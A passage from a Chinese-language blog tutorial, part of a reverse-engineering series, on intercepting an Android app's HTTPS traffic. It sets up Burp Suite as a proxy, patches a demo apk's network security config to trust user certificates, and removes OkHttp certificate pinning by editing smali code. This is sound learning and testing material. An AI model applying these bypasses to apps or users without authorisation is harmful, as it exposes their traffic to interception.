src="/img/android-apk-decompile-intro/p7-proxy.png"></p><p>電腦的 proxy 就這樣設置完成了，接著我們來設定手機。</p><p>在開始設定以前，記得要先讓手機跟電腦連到同一個 wifi，才會在同樣的網路底下。再來，在電腦上看一下自己的內網 IP 是多少，前往手機裡的設定 &#x3D;&gt; 連線 &#x3D;&gt; Wi-Fi，接著編輯連到的網路，設置手動 proxy，讓手機的流量 proxy 到電腦去。</p><p>然後我們要在手機上安裝 Burp Suite 的憑證，手機上直接造訪 <code>http://burpsuite</code> 即可，會下載一個檔案叫做 <code>cert.der</code>，記得改名成 <code>cert.cer</code> 後點開就可以安裝憑證。</p><p>到這邊為止，手機上的準備就完成了。</p><h2><span id="改造-apk">改造 apk</span></h2><p>這次拿來示範的 apk 在這裡：<a href="https://github.com/aszx87410/demo/raw/master/android/demoapp-http.apk">https://github.com/aszx87410/demo/raw/master/android/demoapp-http.apk</a></p><p>App 的內容很簡單，就是按下按鈕以後會發 request，只要有監聽到就代表成功了。裝上 app 之後可以先試試看，你應該會發現儘管上面那些都設定好了，proxy 還是一片空白。</p><p>原因就如同我開頭講的一樣，在 Android 官方文件裡有一個章節就在講這個：<a href="https://developer.android.com/training/articles/security-config">Network security configuration</a></p><p>而改造方法也很簡單，基本上不需要動到程式碼，因此我們先用 Apktool 把 apk 解開。</p><p>接著打開 AndroidManifest.xml，找到 <code>&lt;application&gt;</code> 的地方，看一下有沒有 <code>android:networkSecurityConfig</code> 這個屬性，沒有的話就加上去：<code>android:networkSecurityConfig=&quot;@xml/network_security_config&quot;</code>，有的話就記住 xml 的名稱。</p><p>再來我們去 res&#x2F;xml 底下，新增 <code>network_security_config.xml</code>，內容為：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>network-security-config</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base-config</span> <span class="token attr-name">cleartextTrafficPermitted</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>trust-anchors</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>certificates</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>system<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>certificates</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>trust-anchors</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>base-config</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>network-security-config</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這個檔案內容代表這個 app 信任所有憑證，包括使用者自行安裝的憑證也是。如果 app 裡面本來就有這個檔案，你可以把內容取代成上面的，確保 app 有信任使用者的憑證。</p><p>接著把 apk 打包裝回去，再按下按鈕看看，應該就能從 proxy 看到攔截到的流量：</p><p><img src="/img/android-apk-decompile-intro/p8-success.png"></p><h2><span id="certificate-pinning">Certificate pinning</span></h2><p>如果上面的動作做完以後，proxy 還是監聽不到，那就代表 app 裡面可能有其他安全性的設置，例如說 certificate pinning。</p><p>什麼是 certificate pinning 呢？如果網頁有用 https，就代表伺服器有一個 https 的憑證，而 certificate pinning 就代表 app 裡有指定某個 domain 對應到的憑證應該要是什麼，如果憑證不符，就代表有人在中間搞事，所以拒絕連線。</p><p>以熱門的 library OkHttp 為例，<a href="https://square.github.io/okhttp/4.x/okhttp/okhttp3/-certificate-pinner/">文件</a>上就有寫說應該怎麼實作這個功能：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> hostname <span class="token operator">=</span> <span class="token string">"publicobject.com"</span><span class="token punctuation">;</span><span class="token class-name">CertificatePinner</span> certificatePinner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CertificatePinner<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> <span class="token string">"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">OkHttpClient</span> client <span class="token operator">=</span> <span class="token class-name">OkHttpClient<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">certificatePinner</span><span class="token punctuation">(</span>certificatePinner<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Request</span> request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"https://"</span> <span class="token operator">+</span> hostname<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>client<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想實作看看的話，可以拿這個 apk 檔來嘗試：<a href="https://github.com/aszx87410/demo/raw/master/android/demoapp-pinning.apk">https://github.com/aszx87410/demo/raw/master/android/demoapp-pinning.apk</a></p><p>我們一樣用 apktool 解開，接著先照之前那樣，把 network security config 給放進去，再來就是要找到程式碼哪裡有用到 certificate pinner 了。</p><p>因為這次的程式碼有開啟 proguard，所以連 okhttp 也被混淆了，直接用 <code>certificatePinner</code> 做關鍵字下去搜尋不一定找得到東西。那怎麼辦呢？我們可以換個方式，在使用這個功能的時候，一定要寫一組 sha256 的值在裡面，所以我們可以搜尋：<code>sha256/</code></p><p>可以找到這樣一個段落：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"># virtual methods<span class="token punctuation">.</span>method <span class="token keyword">public</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token punctuation">.</span>locals <span class="token number">13</span>    <span class="token punctuation">.</span>line <span class="token number">1</span>    <span class="token keyword">new</span><span class="token operator">-</span>instance v0<span class="token punctuation">,</span> <span class="token class-name">Ljava</span><span class="token operator">/</span>util<span class="token operator">/</span><span class="token class-name">ArrayList</span><span class="token punctuation">;</span>    invoke<span class="token operator">-</span>direct <span class="token punctuation">&#123;</span>v0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Ljava</span><span class="token operator">/</span>util<span class="token operator">/</span><span class="token class-name">ArrayList</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">const</span><span class="token operator">-</span>string v1<span class="token punctuation">,</span> <span class="token string">"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="</span>    <span class="token punctuation">.</span>line <span class="token number">2</span>    filled<span class="token operator">-</span><span class="token keyword">new</span><span class="token operator">-</span>array <span class="token punctuation">&#123;</span>v1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span>    move<span class="token operator">-</span>result<span class="token operator">-</span>object v1    <span class="token keyword">const</span><span class="token operator">-</span>string v2<span class="token punctuation">,</span> <span class="token string">"archive.org"</span>    <span class="token keyword">const</span><span class="token operator">-</span>string v3<span class="token punctuation">,</span> <span class="token string">"pattern"</span>    <span class="token punctuation">.</span>line <span class="token number">3</span>    invoke<span class="token operator">-</span><span class="token keyword">static</span> <span class="token punctuation">&#123;</span>v2<span class="token punctuation">,</span> v3<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lc</span><span class="token operator">/</span>j<span class="token operator">/</span>b<span class="token operator">/</span>d<span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">d</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Object</span><span class="token punctuation">;</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">const</span><span class="token operator">-</span>string v3<span class="token punctuation">,</span> <span class="token string">"pins"</span>    invoke<span class="token operator">-</span><span class="token keyword">static</span> <span class="token punctuation">&#123;</span>v1<span class="token punctuation">,</span> v3<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lc</span><span class="token operator">/</span>j<span class="token operator">/</span>b<span class="token operator">/</span>d<span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">d</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Object</span><span class="token punctuation">;</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> v3<span class="token punctuation">,</span> <span class="token number">0x0</span>    <span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> v4<span class="token punctuation">,</span> <span class="token number">0x0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到之後該做什麼呢？難道要去改 smali，把 certificate pinner 拿掉嗎？其實有更簡單的做法。</p><p>從程式碼中可以猜得出來底下那個 <code>archive.org</code> 應該就是綁定的網域，因此只要把這個網域隨便改成其他字串即可，如此一來其他的網域就不會檢查憑證是否相符。</p><p>改完以後重新打包 app 並安裝，就能正常監聽到流量。</p><p>像上面這樣是去改變使用 certificatePinner 的地方，還有另一個方式是直接去改變 okhttp 的實作，找到 smali 中的 <code>okhttp3/CertificatePinner$Builder.smali</code>，有一個 function 是：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"># virtual methods<span class="token punctuation">.</span>method <span class="token keyword">public</span> varargs <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Lokhttp3</span><span class="token operator">/</span><span class="token class-name">CertificatePinner</span>$<span class="token class-name">Builder</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span>locals <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>這個就是 okhttp 在處理新增 certificate pinner 時的方法，我們只要這樣改就好了：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"># virtual methods<span class="token punctuation">.</span>method <span class="token keyword">public</span> varargs <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Lokhttp3</span><span class="token operator">/</span><span class="token class-name">CertificatePinner</span>$<span class="token class-name">Builder</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span>locals <span class="token number">5</span>    # patch    <span class="token keyword">const</span><span class="token operator">-</span>string p1<span class="token punctuation">,</span> <span class="token string">"abc"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這樣第一個參數（domain）就永遠是 abc，永遠不會生效。</p><h2><span id="總結">總結</span></h2><p>這篇文章中我們學習到了如何自己動手改造 app，拿掉一些防中間人攻擊的機制，例如說改掉 network security config 以及程式碼中處理 certificate pinning 的部分。</p><p>對於一般的 app 來說，做到這邊應該就滿夠的了，至少能夠監聽流量，看見 app 到底發送了些什麼。而且跟 VPN 的解法相比，還有另外一個好處，那就是可以二次打包，包出一個把 API 網址換掉也能動的版本，自由度比較高。</p><p>在下一篇裡面，我們會學習另外一種分析 app 的方式。</p><p>系列文連結：</p><ol><li><a href="/2023/04/27/android-apk-decompile-intro-1/">Android App 逆向入門之一：拆開與重組 apk</a></li><li><a href="/2023/04/27/android-apk-decompile-intro-2/">Android App 逆向入門之二：修改 smali 程式碼</a></li><li><a href="/2023/04/27/android-apk-decompile-intro-3/">Android App 逆向入門之三：監聽 app 封包</a> - 你在這篇</li><li><a href="/2023/04/27/android-apk-decompile-intro-4/">Android App 逆向入門之四：使用 Frida 進行動態分析</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;我記得在我剛接觸 Android 沒多久的時候，要看 app 到底發了哪些 request 是很簡單的一件事情。只要在電腦上面裝個 &lt;a href=&quot;https://www.charlesproxy.com/&quot;&gt;Charles&lt;/a&gt;，接著設定手機上的 Wifi，讓它 proxy 到電腦上，然後輸入特定網址下載 Charles 提供的憑證，安裝完成以後就搞定了。&lt;/p&gt;
&lt;p&gt;但前陣子用了一樣的流程，雖然有聽到一些封包，但從 app 出來的流量卻是空的，上網找了各式各樣的解法之後都行不通。&lt;/p&gt;
&lt;p&gt;最後我才知道，原來是 Android 在 6.0 以上改變了安全性的設定，預設就不相信使用者自行安裝的憑證，所以才會攔截不到。有種做法是裝個 local VPN，這樣流量就會全部都過 proxy，但我試過以後發現還是有點麻煩。&lt;/p&gt;
&lt;p&gt;在眾多方法之中，我試過最有用的方法，就是把 apk 拆開，改一些設定之後再裝回去，這篇就來記錄一下流程跟心得。&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
</feed>
